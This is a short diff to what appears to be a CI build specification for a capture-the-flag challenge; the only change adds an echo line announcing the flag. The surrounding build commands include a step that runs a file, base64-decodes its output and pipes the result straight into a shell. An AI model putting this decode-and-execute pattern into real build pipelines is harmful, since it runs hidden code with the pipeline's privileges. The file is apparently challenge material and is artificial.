@@ -5,4 +5,5 @@ phases:
     commands:
       - echo "This build worked, or are you trying to cheat?"
       - chmod +x flag
+      - echo "Below is your flag"
       - sh flag | base64 --decode | sh
